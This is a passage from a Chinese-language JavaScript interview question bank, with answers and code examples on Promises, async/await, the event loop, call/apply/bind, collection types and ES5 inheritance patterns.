的区别？参考答案： Set 成员不能重复； 只有键值，没有键名，有点类似数组； 可以遍历，方法有 add、delete、has WeakSet 成员都是对象（引用）； 成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露； 不能遍历，方法有 add、delete、has； Map 本质上是键值对的集合，类似集合； 可以遍历，方法很多，可以跟各种数据格式转换； WeakMap 只接收对象为键名（null 除外），不接受其他类型的值作为键名； 键名指向的对象，不计入垃圾回收机制； 不能遍历，方法同 get、set、has、delete； 24、简单说说 js 中有哪几种内存泄露的情况 意外的全局变量； 闭包； 未被清空的定时器； 未被销毁的事件监听； DOM 引用； 25、json和xml数据的区别参考答案： 数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。 数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。 数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互 数据描述方面：json对数据的描述性比xml较差 xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。 26、JavaScript有几种方法判断变量的类型?参考答案： 使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。 使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。 使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。 27、MathMath 对象方法 方法 描述 abs(x) 返回 x 的绝对值。 acos(x) 返回 x 的反余弦值。 asin(x) 返回 x 的反正弦值。 atan(x) 以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。 atan2(y,x) 返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。 ceil(x) 对数进行上舍入。 cos(x) 返回数的余弦。 exp(x) 返回 Ex 的指数。 floor(x) 对 x 进行下舍入。 log(x) 返回数的自然对数（底为e）。 max(x,y,z,…,n) 返回 x,y,z,…,n 中的最高值。 min(x,y,z,…,n) 返回 x,y,z,…,n中的最低值。 pow(x,y) 返回 x 的 y 次幂。 random() 返回 0 ~ 1 之间的随机数。 round(x) 四舍五入。 sin(x) 返回数的正弦。 sqrt(x) 返回数的平方根。 tan(x) 返回角的正切。 Math.max(...[14, 3, 77]) //ES6 的写法，等同于Math.max(14, 3, 77) 题目： var min = Math.min(); var max = Math.max(); console.log(min &lt; max); // 写出执行结果，并解释原因 答案false 解析 按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false MDN 相关文档是这样解释的 Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。 而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false 28、promise和 async await 区别参考答案： 概念Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的 async await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。 两者的区别 Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。 async await与Promise一样，是非阻塞的。 async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。 29、 defer和async区别参考答案： 区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个 解析： 在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后 &lt;script src=\"script.js\">&lt;/script> async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。但是多个js文件的加载顺序不会按照书写顺序进行 &lt;script async src=\"script.js\">&lt;/script> derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。 &lt;script defer src=\"script.js\">&lt;/script> 30、同步和异步参考答案： 同步 指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。 也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。 异步 异步任务是指不进入主线程，而进入 任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。 每一个任务有一个或多个 回调函数。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。 程序的执行顺序和任务的排列顺序是不一致的，异步的。 我们常用的setTimeout和setInterval函数，Ajax都是异步操作。 31、 实现异步的方法参考答案： 回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await JS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await async&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。 async&#x2F;await可以说是异步终极解决方案了。 (1) async&#x2F;await函数相对于Promise，优势体现在： 处理 then 的调用链，能够更清晰准确的写出代码 并且也能优雅地解决回调地狱问题。 当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。 (2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点： 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。 async&#x2F;await Async&#x2F;Await简介 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点： async&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。 async&#x2F;await与Promise一样，是非阻塞的。 3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。 一个函数如果加上 async ，那么该函数就会返回一个 Promise async function async1() &#123; return \"1\" &#125; console.log(async1()) // -> Promise &#123;&lt;resolved>: \"1\"&#125; Generator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现 let fs = require('fs') function read(file) &#123; return new Promise(function(resolve, reject) &#123; fs.readFile(file, 'utf8', function(err, data) &#123; if (err) reject(err) resolve(data) &#125;) &#125;) &#125; async function readResult(params) &#123; try &#123; let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例 let p2 = await read(p1, 'utf8') let p3 = await read(p2, 'utf8') console.log('p1', p1) console.log('p2', p2) console.log('p3', p3) return p3 &#125; catch (error) &#123; console.log(error) &#125; &#125; readResult('1.txt').then( // async函数返回的也是个promise data => &#123; console.log(data) &#125;, err => console.log(err) ) // p1 2.txt // p2 3.txt // p3 结束 // 结束 5.2 Async&#x2F;Await并发请求 如果请求两个文件，毫无关系，可以通过并发请求 let fs = require('fs') function read(file) &#123; return new Promise(function(resolve, reject) &#123; fs.readFile(file, 'utf8', function(err, data) &#123; if (err) reject(err) resolve(data) &#125;) &#125;) &#125; function readAll() &#123; read1() read2()//这个函数同步执行 &#125; async function read1() &#123; let r = await read('1.txt','utf8') console.log(r) &#125; async function read2() &#123; let r = await read('2.txt','utf8') console.log(r) &#125; readAll() // 2.txt 3.txt 32、 promise的介绍与使用Promise 介绍： ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。 Promise对象, 可以将异步操作以同步的流程表达出来。使用 Promise 主要有以下好处： 可以很好地解决回调地狱的问题（避免了层层嵌套的回调函数）。 语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。 Promise 使用： 语法 var promise = new Promise((resolve, reject) => &#123;/* executor函数 */ // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125; &#125;); promise.then((value) => &#123; //success &#125;, (error) => &#123; //failure &#125;) 参数executor 函数在Promise构造函数执行时同步执行，被传递 resolve 和 reject 函数（executor函数在Promise构造函数返回新建对象前被调用）。executor 内部通常会执行一些异步操作，一旦完成，可以调用resolve函数来将promise状态改成fulfilled(完成)，或者将promise的状态改为rejected(失败)。如果在executor函数中抛出一个错误，那么该promise 状态为rejected。executor函数的返回值被忽略。 简单使用 function timeout(ms) &#123; return new Promise((resolve, reject) => &#123; setTimeout(resolve, ms, 'done'); &#125;); &#125; timeout(2000).then((value) => &#123; console.log(value); //done &#125;); 原型方法 Promise.prototype.then(onFulfilled, onRejected) 语法p.then(onFulfilled, onRejected);p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;); 含义为 Promise实例添加状态改变时的回调函数。then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。 链式操作then方法返回的是一个新的promise，因此可以采用链式写法，即then方法后面再调用另一个then方法。 new Promise(resolve => &#123; resolve(1); &#125;) .then(result => console.log(result)) //1 .then(result => &#123; console.log(result); //undefined return 2; &#125;) .then(result => &#123; console.log(result); //2 throw new Error(\"err\"); &#125;) .then((result) =>&#123; console.log(result); &#125;, (err)=>&#123; console.log(err); //Error: err return 3; &#125;) .then((result) => &#123; console.log(result); //3 &#125;) 注意：①不管是then方法的onfulfilled函数参数执行还是onrejected（可选参数）函数参数执行，then方法返回的都是一个新的Promise对象，都可以继续采用链式写法调用另一个then方法。②Promise.prototype.catch()方法返回的也是一个Promise对象。then方法和catch方法可以链式操作。 返回值then方法返回一个Promise，而它的行为与then中的被调用的回调函数(onfulfilled函数&#x2F;onrejected函数)的返回值有关。(1) 如果then中的回调函数返回一个值，那么then返回的Promise将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。 new Promise((resolve, reject) => &#123; reject(); &#125;) .then( () => 99, () => 42 ) .then( result => console.log(result)); // 42 (2) 如果then中的回调函数抛出一个错误，那么then返回的Promise将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123;throw new Error('err')&#125;, () => &#123;&#125;) .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err (3) 如果then中的回调函数返回一个已经是接受状态的Promise，那么then返回的Promise也会成为接受状态，并且将那个Promise的接受状态的回调函数的参数值作为该被返回的Promise的接受状态回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123; return new Promise(resolve => resolve('ok')); &#125;) .then( (result) => &#123;console.log(result)&#125;); //ok (4) 如果then中的回调函数返回一个已经是拒绝状态的Promise，那么then返回的Promise也会成为拒绝状态，并且将那个Promise的拒绝状态的回调函数的参数值作为该被返回的Promise的拒绝状态回调函数的参数值。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then( () => &#123; return new Promise((resolve, reject) => &#123; reject(new Error('err')); &#125;); &#125;) .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err (5) 如果then中的回调函数返回一个未定状态（pending）的Promise，那么then返回Promise的状态也是未定的，并且它的终态与那个Promise的终态相同；同时，它变为终态时调用的回调函数参数与那个Promise变为终态时的回调函数的参数是相同的。 new Promise((resolve, reject) => &#123; resolve(); &#125;) .then(() => &#123; return new Promise(resolve => &#123; setTimeout(resolve, 2000, 'ok'); &#125;); &#125;) .then( (result) => &#123;console.log(result)&#125;); //ok 注意：这里是then方法中被调用回调函数的返回值与then方法返回的Promise对象状态之间的关系。 Promise.prototype.catch(onRejected) 语法 p.catch(onRejected); p.catch(function(reason) &#123; // 拒绝 &#125;); 含义Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数，返回一个新的promise对象。 用法 const p = new Promise((resolve,reject) => &#123; return reject(new Error('err')); //reject方法的作用，等同于抛出错误 //throw new Error('err'); &#125;); p.then(null, (err) => &#123; console.log(err); //Err: err &#125;); //--------等价写法--------- p.catch(err => &#123; console.log(err); //Err: err &#125;) 注意：由于.catch方法是.then(null, rejection)的别名，故.then中的链式操作(3)、返回值(4)等语法在.catch中都适用。 一般总是建议，Promise 对象后面要跟catch方法，这样可以处理 Promise内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。 Promise对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。 即：当前catch方法可以捕获上一个catch方法(包括上一个catch)到当前catch(不包括当前catch)方法之间所有的错误，如果没有错误，则当前catch方法不执行。 new Promise(() &#x3D;&gt; &#123; throw new Error(&#39;err1&#39;); &#125;) .then(() &#x3D;&gt; &#123;console.log(1);&#125;) .then(() &#x3D;&gt; &#123;console.log(2);&#125;) .catch((err) &#x3D;&gt; &#123; console.log(err); &#x2F;&#x2F;Err: err1 throw new Error(&#39;err2&#39;); &#125;) .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2 一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法。 // bad new Promise() .then((data) => &#123;/* success */ &#125;, (err) => &#123;/* error */ &#125;); // good new Promise() .then((data) => &#123; /* success */ &#125;) .catch((err) => &#123;/* error */ &#125;); 上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法。 与传统的try/catch代码块不同的是，即使没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误也不会中止外部脚本运行。 new Promise((resolve) => &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;).then(() => &#123; console.log('ok'); &#125;); setTimeout(() => &#123;console.log('over')&#125;); //Uncaught (in promise) ReferenceError: x is not defined //over 在异步函数中抛出的错误不会被catch捕获到 new Promise((resolve, reject) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; throw &#39;Uncaught Exception!&#39;; &#125;, 1000); &#125;).catch(() &#x3D;&gt; &#123; console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行 &#125;); new Promise((resolve, reject) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; reject(); &#125;, 1000); &#125;).catch(() &#x3D;&gt; &#123; console.log(&#39;err&#39;); &#x2F;&#x2F;err &#125;); 在resolve()后面抛出的错误会被忽略 new Promise((resolve, reject) => &#123; resolve(); throw 'Silenced Exception!'; &#125;).catch(function(e) &#123; console.log(e); // 不会执行 &#125;); Promise.all(iterable) 语法var p = Promise.all([p1, p2, p3]); 含义Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）p的状态由p1、p2、p3决定，分成两种情况。(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 用法 const p1 = 'p1-ok'; const p2 = Promise.resolve('p2-ok'); const p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok')); const p4 = Promise.reject('p4-err'); Promise.all([p1, p2, p3]) .then((resolves) => &#123; resolves.forEach(resolve => &#123; console.log(resolve); //p1-ok p2-ok p3-ok &#125;); &#125;) .catch(() => &#123; console.log('err'); &#125;); Promise.all([p1, p2, p3, p4]) .then(() => &#123; console.log('ok'); &#125;) .catch((err) => &#123; console.log(err); //p4-err &#125;) Promise.race(iterable) 语法var p = Promise.race([p1, p2, p3]); 含义Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。 用法 var p1 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"one\");&#125;); var p2 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"two\");&#125;); Promise.race([p1, p2]) .then(value => &#123; console.log(value); // \"two\" &#125;); var p3 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"three\");&#125;); var p4 = new Promise((resolve, reject) => &#123;setTimeout(reject, 500, \"four\");&#125;); Promise.race([p3, p4]) .then((value) => &#123; console.log(value); // \"three\" &#125;) .catch(err => &#123; // 未被调用 &#125;); var p5 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"five\");&#125;); var p6 = new Promise((resolve, reject) => &#123; setTimeout(reject, 100, \"six\"); &#125;); Promise.race([p5, p6]) .then((value) => &#123; // 未被调用 &#125;).catch((reason) => &#123; console.log(reason); // \"six\" &#125;); Promise.resolve(value) 语法 Promise.resolve(value); Promise.resolve(promise); Promise.resolve(thenable); Promise.resolve等价于下面的写法。 Promise.resolve(value) ; // 等价于 new Promise(resolve => resolve(value)); 含义返回一个状态由给定value决定的Promise实例。 用法(1) 如果该值是一个Promise对象，则直接返回该对象； const p = new Promise((resolve) => &#123;resolve()&#125;); const p2 = Promise.resolve(p); console.log(p === p2); //true (2) 如果参数是thenable对象(即带有then方法的对象)，则返回的Promise对象的最终状态由then方法的执行决定； const thenable = &#123; then(resolve, reject) &#123; resolve(42); &#125; &#125;; Promise.resolve(thenable) .then((value) => &#123; console.log(value); // 42 &#125;); (3) 如果参数是不具有then方法的对象或基本数据类型，则返回的Promise对象的状态为fulfilled，并且将该参数传递给then方法。 Promise.resolve('Hello') .then((s) => &#123; console.log(s); //Hello &#125;); (4) 如果不带有任何参数，则返回的Promise对象的状态为fulfilled，并且将undefined作为参数传递给then方法。 Promise.resolve() .then((s) => &#123; console.log(s); //undefined &#125;); 通常而言，如果你不知道一个值是否是Promise对象，使用Promise.resolve(value) 来返回一个Promise对象,这样就能将该value以Promise对象形式使用。 立即resolve的Promise对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。 setTimeout(function () &#123; console.log('three'); &#125;, 0); Promise.resolve().then( () => &#123; console.log('two'); &#125;); console.log('one'); // one // two // three Promise.reject(reason) 语法 Promise.reject(reason); Promise.reject等价于下面的写法。 var p = Promise.reject(reason); // 等同于 var p = new Promise((resolve, reject) => reject(reason)); 含义返回一个状态为rejected的Promise对象，并将给定的失败信息传递给对应的处理方法。 注意：Promise.resolve(value)方法返回的Promise实例的状态由value决定，可能是fulfilled，也可能是rejected。Promise.reject(reason)方法返回的Promise实例的状态一定是rejected。 用法 Promise.reject(\"Testing static reject\") .then((value) => &#123; // 未被调用 &#125;).catch((reason) => &#123; console.log(reason); // Testing static reject &#125;); Promise.reject(new Error(\"fail\")) .then((value) => &#123; // 未被调用 &#125;).catch((error) => &#123; console.log(error); // Error: fail &#125;); Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。 const thenable = &#123; then(resolve) &#123; resolve('ok'); &#125; &#125;; Promise.resolve(thenable) .then(e => &#123; console.log(e === 'ok'); //true &#125;); Promise.reject(thenable) .catch(e => &#123; console.log(e === thenable); // true &#125;); 与promise.all相反的是哪一个 参考答案： Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。 扩展： 语法 Promise.race(iterable); 参数 iterable 可迭代对象，类似Array 返回值 一个待定的 Promise]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而异步地解析或拒绝（一旦堆栈为空） 33、promise实现文件读取 // const fs = require(\"fs\"); import fs from \"fs\"; import path from \"path\"; const __dirname = path.resolve(); function readFile(file) &#123; return new Promise((resolve, reject) => &#123; fs.readFile(path.join(__dirname, file), (err, data) => &#123; if (data) &#123; resolve(data.toString()); &#125; else &#123; reject(err); &#125; &#125;); &#125;); &#125; readFile(\"./JavaScript/promise/file/file1.txt\") .then((data) => &#123; console.log(data); return readFile(\"./JavaScript/promise/file/file1.txt\"); &#125;) .then((data) => &#123; console.log(data); &#125;); 33、用js实现sleep，用promisefunction SLeep_p(time) &#123; return new Promise((resolve, reject) => &#123; setTimeout(resolve, time); &#125;); &#125; SLeep_p(2000).then(() => &#123; console.log(\"kif\"); &#125;); 34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.thenconsole.time('start'); setTimeout(function() &#123; console.log(2); &#125;, 10); setImmediate(function() &#123; console.log(1); &#125;); new Promise(function(resolve) &#123; console.log(3); resolve(); console.log(4); &#125;).then(function() &#123; console.log(5); console.timeEnd('start') &#125;); console.log(6); process.nextTick(function() &#123; console.log(7); &#125;); console.log(8); 参考答案： 综合的执行顺序就是： 3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2 解析： 本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下： 所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack) 在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务 一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行 主线程不断重复上面的第三步 在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。 Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。 在Job queue中的队列分为两种类型： 宏任务 Macrotask 宏任务是指Event Loop在每个阶段执行的任务 微任务 Microtask 微任务是指Event Loop在每个阶段之间执行的任务 我们举例来看执行顺序的规定，我们假设 宏任务队列包含任务: A1, A2 , A3 微任务队列包含任务: B1, B2 , B3 执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。 了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示： 宏任务 Macrotask队列真实包含任务： script(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering 微任务 Microtask队列真实包含任务： process.nextTick, Promises, Object.observe, MutationObserver 由此我们得到的执行顺序应该为： script(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering 在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs 我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的 接下来我们分析我们的题目，首先分析Job queue的执行顺序： script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate 主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序） process.nextTick: 输出7 promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’) setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时 setTimeout ： 输出2 35、call appy bind的作用和区别参考答案： 作用： 都可以改变函数内部的this指向。 区别点： call 和 apply 会调用函数，并且改变函数内部this指向。 call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg] bind 不会调用函数，可以改变函数内部this指向。 解析： call方法 改变函数内部this指向 call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。 写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数 call 的主要作用也可以实现继承 apply方法 apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。 写法：fun.apply(thisArg, [argsArray]) thisArg:在fun函数运行时指定的this值 argsArray:传递的值，必须包含在数组里面 返回值就是函数的返回值，因为他就是调用函数 apply的主要应用，比如可以利用apply可以求得数组中最大值 const arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max); bind方法 bind()方法不会调用函数，但是能改变函数内部this指向 写法：fun.bind(thisArg, arg1, arg2, …) thisArg:在fun函数运行时指定的this值 arg1,arg2:传递的其他参数 返回由指定的this值和初始化参数改造的原函数拷贝 var&#96; &#96;o &#x3D; &#123;&#96;&#96; &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96; &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f(); bind应用 如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了 const btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96; &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96; &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96; &#96;&#96;setTimeout(&#96;&#96; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96; &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96; &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96; &#96;&#96;2000&#96;&#96; &#96;&#96;);&#96;&#96; &#96;&#96;&#125;;&#96;&#96;&#125; 扩展: 主要应用场景： call 经常做继承。 apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。 bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。 36、继承，优缺点参考答案： 继承的好处 a：提高了代码的复用性 b：提高了代码的维护性 c：让类与类之间产生了关系，是多态的前提 继承的弊端 类的耦合性增强了,但是开发的原则：高内聚，低耦合。 37、ES5 js继承的方法和优缺点参考答案： 原型链继承 实现方式：将子类的原型链指向父类的对象实例 function Parent()&#123; this.name = \"parent\"; this.list = ['a']; &#125; Parent.prototype.sayHi = function()&#123; console.log('hi'); &#125; function Child()&#123; &#125; Child.prototype = new Parent(); var child = new Child(); console.log(child.name); child.sayHi(); 原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下： var a = new Child(); var b = new Child(); a.list.push('b'); console.log(b.list); // ['a','b'] 构造函数继承 实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数 function Parent(name, id)&#123; this.id = id; this.name = name; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; var child = new Child(\"jin\", \"1\"); child.printName(); // jin child.sayName() // Error 原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性优点：可解决原型链继承的缺点缺点：不可继承父类的原型链方法，构造函数不可复用 组合继承 原理：综合使用构造函数继承和原型链继承 function Parent(name, id)&#123; this.id = id; this.name = name; this.list = ['a']; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; Child.prototype = new Parent(); var child = new Child(\"jin\", \"1\"); child.printName(); // jin child.sayName() // jin var a = new Child(); var b = new Child(); a.list.push('b'); console.log(b.list); // ['a'] 优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数 原型式继承 原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象 var parent = &#123; names: ['a'] &#125; function copy(object) &#123; function F() &#123;&#125; F.prototype = object; return new F(); &#125; var child = copy(parent); 缺点：共享引用类型 寄生式继承 原理：二次封装原型式继承，并拓展 function createObject(obj) &#123; var o = copy(obj); o.getNames = function() &#123; console.log(this.names); return this.names; &#125; return o; &#125; 优点：可添加新的属性和方法 寄生组合式继承 原理：改进组合继承，利用寄生式继承的思想继承原型 function inheritPrototype(subClass, superClass) &#123; // 复制一份父类的原型 var p = copy(superClass.prototype); // 修正构造函数 p.constructor = subClass; // 设置子类原型 subClass.prototype = p; &#125; function Parent(name, id)&#123; this.id = id; this.name = name; this.list = ['a']; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; 